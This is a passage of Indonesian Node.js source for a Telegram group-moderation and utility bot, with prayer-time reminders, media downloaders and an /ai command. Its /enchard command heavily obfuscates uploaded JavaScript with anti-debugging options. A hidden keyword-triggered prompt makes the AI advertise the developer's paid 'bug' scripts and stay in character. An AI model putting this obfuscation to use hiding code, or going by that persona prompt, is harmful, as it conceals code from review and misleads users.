  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
    { parse_mode: "HTML" }
  );

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> Contoh penggunaan:</blockquote>
<blockquote>/antipromosi on
/antipromosi off
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const opt = option.toLowerCase();

  let settings = getSettings();
  if (!settings[chatId]) settings[chatId] = {};

  const current = settings[chatId].antipromosi ?? false;

  if (opt === "on" && current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiPromosi sudah aktif sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (opt === "off" && !current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiPromosi sudah dimatikan sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  settings[chatId].antipromosi = opt === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> AntiPromosi berhasil ${opt}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/^\/antibokep(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;

  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
     { parse_mode: "HTML" }
  );

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> Contoh penggunaan:</blockquote>
<blockquote>/antibokep on
/antibokep off
</blockquote>`,
  { parse_mode: "HTML" }
    );
  }

  const opt = option.toLowerCase();

  let settings = getSettings();
  if (!settings[chatId]) settings[chatId] = {};

  const current = settings[chatId].antibokep ?? false;

  if (opt === "on" && current) {
  return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiBokep sudah aktif sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (opt === "off" && !current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiBokep sudah dimatikan sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  settings[chatId].antibokep = opt === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> AntiBokep berhasil ${opt}</blockquote>`,
      { parse_mode: "HTML" }
    );
});

// =================== ANTIVIDEO ===================
bot.onText(/^\/antivideo(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;

  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
    { parse_mode: "HTML" }
  );

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> Contoh penggunaan:</blockquote>
<blockquote>/antivideo on
/antivideo off
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const opt = option.toLowerCase();
  let settings = getSettings();
  if (!settings[chatId]) settings[chatId] = {};

  const current = settings[chatId].antivideo ?? false;

  if (opt === "on" && current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiVideo sudah aktif sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (opt === "off" && !current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiVideo sudah dimatikan sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  settings[chatId].antivideo = opt === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> AntiVideo berhasil ${opt}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// =================== SETKOTA SHOLAT ===================
bot.onText(/^\/setkota(?:@\w+)?(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;

  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
    { parse_mode: "HTML" }
  );

  const kotaInput = match[1];

  const kotaTersedia = [
    "jakarta", "bandung", "surabaya", "tasikmalaya", "palembang",
    "medan", "semarang", "yogyakarta", "makassar", "denpasar",
    "malang", "depok", "bekasi", "tangerang", "bogor",
    "padang", "pekanbaru", "balikpapan", "samarinda", "manado"
  ];

  if (!kotaInput) {
    const listKota = kotaTersedia.map(k => `• ${k}`).join("\n");
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="5318986077455795572">📍</tg-emoji> <b>SET KOTA WAKTU SHOLAT</b></blockquote>

Gunakan: <code>/setkota nama_kota</code>

<blockquote><b>Daftar kota tersedia:</b>
${listKota}</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const kota = kotaInput.toLowerCase().trim();

  if (!kotaTersedia.includes(kota)) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Kota <b>${kota}</b> tidak tersedia.

Ketik /setkota untuk lihat daftar kota yang bisa dipilih.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  let settings = getSettings();
  if (!settings[chatId]) settings[chatId] = {};
  settings[chatId].kota = kota;
  saveSettings(settings);

  bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6269163801178804220">✅</tg-emoji> Kota waktu sholat berhasil diset ke <b>${kota.charAt(0).toUpperCase() + kota.slice(1)}</b>.

Aktifkan pengingat sholat dengan /waktusholat on</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// =================== ANTINUMBER ===================
bot.onText(/^\/antinumber(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;

  if (isMaintenance(msg)) return;
  if (!onlyGroup(msg, bot)) return;
  if (!await requireJoin(msg)) return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) return bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Hanya admin yang boleh mengubah setting.</blockquote>`,
    { parse_mode: "HTML" }
  );

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> Contoh penggunaan:</blockquote>
<blockquote>/antinumber on
/antinumber off</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const opt = option.toLowerCase();
  let settings = getSettings();
  if (!settings[chatId]) settings[chatId] = {};

  const current = settings[chatId].antinumber ?? false;

  if (opt === "on" && current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiNumber sudah aktif sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (opt === "off" && !current) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6100467849548010364">⚠️</tg-emoji> AntiNumber sudah dimatikan sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  settings[chatId].antinumber = opt === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    opt === "on"
      ? `<blockquote><tg-emoji emoji-id="6269163801178804220">✅</tg-emoji> AntiNumber aktif! Nomor HP dari seluruh dunia akan otomatis dihapus.</blockquote>`
      : `<blockquote><tg-emoji emoji-id="6269316311172518259">😭</tg-emoji> AntiNumber dimatikan.</blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/^\/waktusholat(?:@\w+)?(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;

  if (!await requireJoin(msg)) return;
  if (!msg.chat.type.includes("group")) return;

  let settings = getSettings();
  if (!settings[chatId]) settings[chatId] = {};

  const option = match[1];

  if (!option) {
    return bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="4956611513369494230">⚠️</tg-emoji> Gunakan perintah:</blockquote>
<blockquote>/waktusholat on  
/waktusholat off</blockquote>`, {
      parse_mode: "HTML"
    });
  }

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) {
    return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="6269316311172518259">😭</tg-emoji> Hanya admin yang bisa mengubah pengaturan.</blockquote>`, {
      parse_mode: "HTML"
    });
  }

  const mode = option.toLowerCase();
  const current = settings[chatId].waktusholat ?? false;

  if (mode === "on" && current) {
    return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="4956611513369494230">⚠️</tg-emoji> Waktu sholat sudah aktif sebelumnya.</blockquote>`, {
      parse_mode: "HTML"
    });
  }

  if (mode === "off" && !current) {
    return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="4956611513369494230">⚠️</tg-emoji> Waktu sholat sudah dimatikan sebelumnya.</blockquote>`, {
      parse_mode: "HTML"
    });
  }

  settings[chatId].waktusholat = mode === "on";
  saveSettings(settings);

  bot.sendMessage(chatId,
    mode === "on"
      ? `<blockquote><tg-emoji emoji-id="6269163801178804220">✅</tg-emoji> Waktu sholat berhasil diaktifkan.</blockquote>`
      : `<blockquote><tg-emoji emoji-id="6269316311172518259">😭</tg-emoji> Waktu sholat berhasil dimatikan.</blockquote>`, {
        parse_mode: "HTML"
    });
});

setInterval(async () => {
  const settings = getSettings();

  for (const chatId in settings) {
    const group = settings[chatId];

    // Cek apakah fitur waktusholat AKTIF di grup ini
    if (!group.waktusholat) continue;

    // Ambil kota per-grup, fallback ke jakarta jika belum diset
    const kota = (group.kota || "jakarta").toLowerCase();

    // Tentukan zona waktu berdasarkan kota (WIT = Makassar, WITA = sebagian, WIB = default)
    let zona = "Asia/Jakarta"; // WIB default
    const kotaWITA = ["makassar", "denpasar", "balikpapan", "samarinda", "manado", "palu", "kendari", "gorontalo", "ambon", "ternate", "kupang"];
    const kotaWIT  = ["jayapura", "sorong", "manokwari", "merauke", "timika"];
    if (kotaWITA.includes(kota)) zona = "Asia/Makassar";
    if (kotaWIT.includes(kota)) zona = "Asia/Jayapura";

    const jamSekarang = moment().tz(zona).format("HH:mm");

    // Ambil jadwal sholat (pakai cache agar hemat API)
    const jadwal = await getJadwal(kota);
    if (!jadwal) {
      console.log(chalk.yellow(`[SHOLAT] Gagal ambil jadwal untuk kota: ${kota} (grup: ${chatId})`));
      continue;
    }

    const daftarSholat = {
      "Imsak":   formatWaktu(jadwal.Imsak),
      "Subuh":   formatWaktu(jadwal.Fajr),
      "Dzuhur":  formatWaktu(jadwal.Dhuhr),
      "Ashar":   formatWaktu(jadwal.Asr),
      "Maghrib": formatWaktu(jadwal.Maghrib),
      "Isya":    formatWaktu(jadwal.Isha)
    };

    for (const [nama, waktu] of Object.entries(daftarSholat)) {
      // Key unik per grup+kota+waktu sholat+hari agar tidak spam
      const uniqueKey = `${chatId}_${kota}_${nama}_${moment().format("YYYY-MM-DD")}`;

      if (jamSekarang === waktu && lastSent[uniqueKey] !== waktu) {
        lastSent[uniqueKey] = waktu;

        let pesanIslami = "Selamat menunaikan ibadah sholat, semoga berkah! 🤲";
        if (nama === "Maghrib") pesanIslami = "Selamat berbuka bagi yang berpuasa & selamat sholat Maghrib! ✨";
        if (nama === "Imsak") pesanIslami = "Waktu Imsak telah tiba, selamat bersiap puasa bagi yang menjalankan. 🌙";
        if (nama === "Subuh") pesanIslami = "Sholat Subuh adalah kunci keberkahan hari. Jangan sampai terlewat! 🌅";
        if (nama === "Dzuhur") pesanIslami = "Luangkan sejenak dari kesibukan untuk menunaikan sholat Dzuhur. 🕛";
        if (nama === "Ashar") pesanIslami = "Jangan tunda sholat Ashar, waktu terus berjalan! 🌤";
        if (nama === "Isya") pesanIslami = "Tutup malam dengan sholat Isya, semoga malam penuh keberkahan. 🌙";

        bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6271271702408204490">🟡</tg-emoji> <b>PANGGILAN SHOLAT</b></blockquote>

Waktu <b>${nama}</b> telah tiba untuk wilayah <b>${kota.toUpperCase()}</b> dan sekitarnya.
<i>${pesanIslami}</i>

<blockquote><tg-emoji emoji-id="5368295871131695793">⏰</tg-emoji> Jam: <b>${waktu}</b>
<tg-emoji emoji-id="5318986077455795572">📍</tg-emoji> Lokasi: ${kota.charAt(0).toUpperCase() + kota.slice(1)}</blockquote>`,
        { parse_mode: "HTML" }).catch(err => console.error("Gagal kirim jadwal:", err.message));

        console.log(chalk.blue(`[SHOLAT] Sent ${nama} to ${chatId} (${kota})`));
      }
    }
  }
}, 60000); // Cek setiap 1 menit

/* All Command Tools & More Menu */
bot.onText(/^\/ping(@\w+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  const start = Date.now();

  const sent = await bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="5251203410396458957">🏓</tg-emoji> Mengecek kecepatan...</blockquote>`, {
    parse_mode: "HTML"
  });

  const end = Date.now();
  const latency = end - start;

  const uptimeSec = process.uptime();
  const hours = Math.floor(uptimeSec / 3600);
  const minutes = Math.floor((uptimeSec % 3600) / 60);
  const seconds = Math.floor(uptimeSec % 60);

  const memory = process.memoryUsage();
  const usedMB = (memory.rss / 1024 / 1024).toFixed(2);
  const heapMB = (memory.heapUsed / 1024 / 1024).toFixed(2);

  const text = `
<blockquote><tg-emoji emoji-id="5251203410396458957">🏓</tg-emoji> <b>PONG!</b></blockquote>
<blockquote><tg-emoji emoji-id="5456140674028019486">⚡</tg-emoji> Response Time: <b>${latency} ms</b>
<tg-emoji emoji-id="5454415424319931791">⏳</tg-emoji> Uptime: <b>${hours}h ${minutes}m ${seconds}s</b>
<tg-emoji emoji-id="5298975240708187753">💾</tg-emoji> RAM Used: <b>${usedMB} MB</b>
<tg-emoji emoji-id="5992390297533816030">📦</tg-emoji> Heap Used: <b>${heapMB} MB</b>
<tg-emoji emoji-id="6093875388281263010">🖥️</tg-emoji> Platform: <b>${os.platform()}</b>
<tg-emoji emoji-id="5978680276593676052">🔅</tg-emoji> Node: <b>${process.version}</b>
<tg-emoji emoji-id="5321141214735508486">📡</tg-emoji> Status: <b>Online</b></blockquote>
`;

  await bot.editMessageText(text, {
    chat_id: chatId,
    message_id: sent.message_id,
    parse_mode: "HTML"
  });
});

bot.onText(/^\/ai(@\w+)?\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  let text = match[2];

  const loadingMsg = await bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="5287684458881756303">🤖</tg-emoji> AI sedang berpikir...</blockquote>`, {
    parse_mode: "HTML"
  });
  
  await bot.sendChatAction(chatId, "typing");

  try {
  
    if (text.toLowerCase().includes("yteamloo")) {
      text = `
Kamu adalah AI yang mengetahui bahwa The Queen - 𝙲ᥣᥲⲩ adalah developer bot Telegram yang kreatif dan inovatif.

Berikut profil The Queen - 𝙲ᥣᥲⲩ:
- Developer bot Telegram multifitur, multi device, bug
- Spesialis sistem game, ranking, winrate
- Sosok Pria yang tampan
- Memiliki kebiasaan seperti mencari janda
- Integrasi AI & automation
- Struktur code rapi dan kompleks
- The Queen - 𝙲ᥣᥲⲩ tidak pernah ribut atau berantem sama yang lain
- dia open partner 135k itu harga promo, dan bisa mendapatkan script bot md, bug dengan tampilan kece

Jawablah pertanyaan user secara kontekstual dan natural.
Jangan keluar dari karakter tersebut.

Pertanyaan user:
${match[1]}
`;
    }

    const response = await axios.get(
      "https://api.betabotz.eu.org/api/search/bing-chat",
      {
        params: {
          text: text,
          apikey: APIKEY
        }
      }
    );

    const data = response.data;

    await bot.deleteMessage(chatId, loadingMsg.message_id);

    if (!data || !data.message) {
      return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="6008233706039284019">⚠️</tg-emoji> AI tidak memberikan respon.</blockquote>`, {
        parse_mode: "HTML"
      });
    }

    const cleanText = cleanAIResponse(data.message);

    bot.sendMessage(chatId, cleanText, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error(error);
    await bot.deleteMessage(chatId, loadingMsg.message_id);
    bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="4956612582816351459">❌</tg-emoji> Terjadi kesalahan saat menghubungi AI.</blockquote>`, {
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/enchard$/, async (msg) => {
  try {
    const chatId = msg.chat.id;

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
      return bot.sendMessage(
        chatId,
        `<blockquote><tg-emoji emoji-id="6008233706039284019">⚠️</tg-emoji> Reply file <b>.js</b> lalu ketik <b>/enchard</b></blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    const doc = msg.reply_to_message.document;

    if (!doc.file_name.endsWith(".js")) {
      return bot.sendMessage(
        chatId,
        `<blockquote><tg-emoji emoji-id="4956612582816351459">❌</tg-emoji> File harus berformat <b>.js</b></blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    const progressMsg = await bot.sendMessage(
      chatId,
      `<blockquote><tg-emoji emoji-id="5897604269141398480">🔐</tg-emoji> <b>ENCHARD PROCESS</b>

▱▱▱▱▱ 0%
Menyiapkan file...
</blockquote>`,
      { parse_mode: "HTML" }
    );

    const msgId = progressMsg.message_id;

    const update = async (percent, text) => {
      const filled = percent / 20;
      const bar = "▰".repeat(filled) + "▱".repeat(5 - filled);

      await bot.editMessageText(
        `<blockquote><tg-emoji emoji-id="5897604269141398480">🔐</tg-emoji> <b>ENCHARD PROCESS</b>
${bar} ${percent}%
${text}
</blockquote>`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "HTML"
        }
      );
    };

    const delay = (ms) => new Promise(r => setTimeout(r, ms));

    await update(20, "Mengunduh file...");
    await delay(800);

    const fileLink = await bot.getFileLink(doc.file_id);

    const inputPath = path.join(__dirname, `tmp_${Date.now()}.js`);
    const outputPath = path.join(__dirname, `enchard_${doc.file_name}`);

    const res = await axios.get(fileLink, { responseType: "text" });
    fs.writeFileSync(inputPath, res.data);

    await update(40, "Menganalisis struktur kode...");
    await delay(900);

    const sourceCode = fs.readFileSync(inputPath, "utf8");

    await update(60, "Mengacak variabel & string...");
    await delay(1000);

    const obfuscated = JavaScriptObfuscator.obfuscate(sourceCode, {
      compact: true,
      controlFlowFlattening: true,
      controlFlowFlatteningThreshold: 1,
      deadCodeInjection: true,
      deadCodeInjectionThreshold: 1,
      stringArray: true,
      stringArrayEncoding: ['rc4'],
      stringArrayThreshold: 1,
      rotateStringArray: true,
      shuffleStringArray: true,
      splitStrings: true,
      splitStringsChunkLength: 5,
      selfDefending: true,
      debugProtection: true,
      debugProtectionInterval: 5000,
      renameGlobals: false,
      renameProperties: false,
      identifierNamesGenerator: 'hexadecimal',
      transformObjectKeys: true,
      unicodeEscapeSequence: false,
      disableConsoleOutput: false // console tetap muncul
    }).getObfuscatedCode();

    await update(80, "Finalisasi enkripsi...");
    await delay(900);

    fs.writeFileSync(outputPath, obfuscated);

    await update(100, "Selesai! Mengirim file...");
    await delay(500);

    await bot.sendDocument(
      chatId,
      outputPath,
      {
        caption: `<blockquote><tg-emoji emoji-id="5897604269141398480">🔐</tg-emoji> <b>ENCHARD SUCCESS</b></blockquote>
<tg-emoji emoji-id="5433653135799228968">📁</tg-emoji> File: <b>${doc.file_name}</b>
<tg-emoji emoji-id="5251203410396458957">🛡</tg-emoji> Level: <b>Hard Obfuscation</b>
<tg-emoji emoji-id="5462921117423384478">⚙️</tg-emoji> Status: <b>Aman & Siap Pakai</b>
<blockquote><i>Gunakan dengan bijak.</i>
<tg-emoji emoji-id="5895734085761896734">©</tg-emoji> The Queen - 𝙲ᥣᥲⲩ</blockquote>`,
        parse_mode: "HTML"
      }
    );

    fs.unlinkSync(inputPath);
    fs.unlinkSync(outputPath);

  } catch (err) {
    console.log(err);
    bot.sendMessage(
      msg.chat.id,
      `<blockquote><tg-emoji emoji-id="4956612582816351459">❌</tg-emoji> Terjadi kesalahan saat enchard file.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/^\/tourl(@\w+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;
    
  const replyMsg = msg.reply_to_message;
  if (!replyMsg) {
    return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Balas sebuah pesan yang berisi file/foto/audio/video/sticker dengan perintah /tourl.</blockquote>`, {
      parse_mode: "HTML"
    });
  }

  if (!replyMsg.document && !replyMsg.photo && !replyMsg.video && !replyMsg.audio && !replyMsg.voice && !replyMsg.sticker && !replyMsg.animation && !replyMsg.video_note) {
    return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Pesan yang kamu balas tidak mengandung media yang bisa diupload.</blockquote>`, {
      parse_mode: "HTML"
    });
  }

  const sent = await bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Mengupload ke Catbox...</blockquote>`, {
    parse_mode: "HTML"
  });

  try {
    let fileId, filename, fileSize;

    if (replyMsg.document) {
      fileId = replyMsg.document.file_id;
      filename = replyMsg.document.file_name || 'file';
      fileSize = replyMsg.document.file_size || 0;
    } else if (replyMsg.photo) {
      const photoArray = replyMsg.photo;
      fileId = photoArray[photoArray.length - 1].file_id;
      filename = 'photo.jpg';
      fileSize = photoArray[photoArray.length - 1].file_size || 0;
    } else if (replyMsg.video) {
      fileId = replyMsg.video.file_id;
      filename = replyMsg.video.file_name || 'video.mp4';
      fileSize = replyMsg.video.file_size || 0;
    } else if (replyMsg.audio) {
      fileId = replyMsg.audio.file_id;
      filename = replyMsg.audio.file_name || 'audio.mp3';
      fileSize = replyMsg.audio.file_size || 0;
    } else if (replyMsg.voice) {
      fileId = replyMsg.voice.file_id;
      filename = 'voice.ogg';
      fileSize = replyMsg.voice.file_size || 0;
    } else if (replyMsg.sticker) {
      fileId = replyMsg.sticker.file_id;
      filename = replyMsg.sticker.is_animated ? 'sticker.tgs' : (replyMsg.sticker.is_video ? 'sticker.webm' : 'sticker.webp');
      fileSize = replyMsg.sticker.file_size || 0;
    } else if (replyMsg.animation) {
      fileId = replyMsg.animation.file_id;
      filename = replyMsg.animation.file_name || 'animation.gif';
      fileSize = replyMsg.animation.file_size || 0;
    } else if (replyMsg.video_note) {
      fileId = replyMsg.video_note.file_id;
      filename = 'videonote.mp4';
      fileSize = replyMsg.video_note.file_size || 0;
    }

    // Telegram hanya bisa download file <= 20MB via bot API
    const MAX_SIZE = 20 * 1024 * 1024;
    if (fileSize > MAX_SIZE) {
      return bot.editMessageText(`<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> File terlalu besar! Maksimal 20MB via bot.</blockquote>`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML"
      });
    }

    const fileLink = await bot.getFileLink(fileId);

    const response = await axios.get(fileLink, {
      responseType: "arraybuffer",
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      timeout: 60000
    });

    const fileBuffer = Buffer.from(response.data);
    const catboxUrl = await uploadToCatbox(fileBuffer, filename);

    if (!catboxUrl || !catboxUrl.startsWith("http")) {
      throw new Error("Catbox tidak mengembalikan URL valid");
    }

    await bot.editMessageText(`<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> Berhasil diupload ke Catbox!\n\n🔗 ${catboxUrl}\n\n<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ</blockquote>`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("TOURL ERROR:", err.message);
    await bot.editMessageText(`<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal upload file: ${err.message}</blockquote>`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/tiktok\b(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1]?.trim();

  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (!url) {
    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
/tiktok https://vt.tiktok.com/xxxxx/</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Sedang mengambil video...</blockquote>
`, { parse_mode: "HTML" });

  try {

    const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${encodeURIComponent(url)}&apikey=${APIKEY}`;
    const response = await axios.get(apiUrl);

    if (!response.data || !response.data.status) {
      return bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal Mengambil Video</blockquote>
`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML"
      });
    }

    const data = response.data.result;
    const videoUrl = data.video?.[0];
    const audioUrl = data.audio?.[0];

    const caption = `<blockquote><b><tg-emoji emoji-id="4970133401857163956">🎵</tg-emoji> TikTok Downloader</b>
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Caption: ${data.title || "-"}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ </blockquote>`;

    if (videoUrl) {
      try {
        const videoRes = await axios.get(videoUrl, {
          responseType: "arraybuffer",
          headers: { "User-Agent": "Mozilla/5.0" }
        });

        const buffer = Buffer.from(videoRes.data);

        try {
          await bot.sendVideo(chatId, buffer, {
            caption,
            parse_mode: "HTML"
          });
        } catch (errVideo) {
          console.log("SEND VIDEO FAILED, TRY DOCUMENT");

          await bot.sendDocument(chatId, {
            source: buffer,
            filename: "tiktok.mp4"
          }, {
            caption,
            parse_mode: "HTML"
          });
        }

      } catch (err) {
        console.log("DOWNLOAD VIDEO ERROR:", err.message);
      }
    }

    if (audioUrl) {
      try {
        const audioRes = await axios.get(audioUrl, {
          responseType: "arraybuffer",
          headers: { "User-Agent": "Mozilla/5.0" }
        });

        await bot.sendAudio(chatId, {
          source: Buffer.from(audioRes.data),
          filename: "tiktok.mp3"
        }, {
          caption: `<blockquote><tg-emoji emoji-id="5355022893178696239">🎧</tg-emoji> Audio By: 𝙲ᥣᥲⲩ
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Caption: ${data.title || "-"}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> Powered By: The Queen - 𝙲ᥣᥲⲩ </blockquote>`,
          parse_mode: "HTML"
        });

      } catch (err) {
        console.log("AUDIO ERROR:", err.message);
      }
    }

    await bot.deleteMessage(chatId, sent.message_id);

  } catch (err) {
    console.log("TIKTOK DL ERROR:", err.response?.data || err.message);

    await bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Terjadi kesalahan saat download</blockquote>
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/tiktokslide\b(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1]?.trim();

  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (!url) {
    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
/tiktokslide https://vt.tiktok.com/xxxxx/</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Sedang mengambil foto slide...</blockquote>
`, { parse_mode: "HTML" });

  try {

    const apiUrl = `https://api.betabotz.eu.org/api/download/ttslide?url=${encodeURIComponent(url)}&apikey=${APIKEY}`;
    const response = await axios.get(apiUrl);

    if (!response.data || !response.data.status) {
      throw new Error("Slide gagal");
    }

    const data = response.data.result;
    const images = data.images || [];
    const audioUrl = data.audio?.[0];

    if (images.length === 0) {
      throw new Error("Tidak ada gambar");
    }

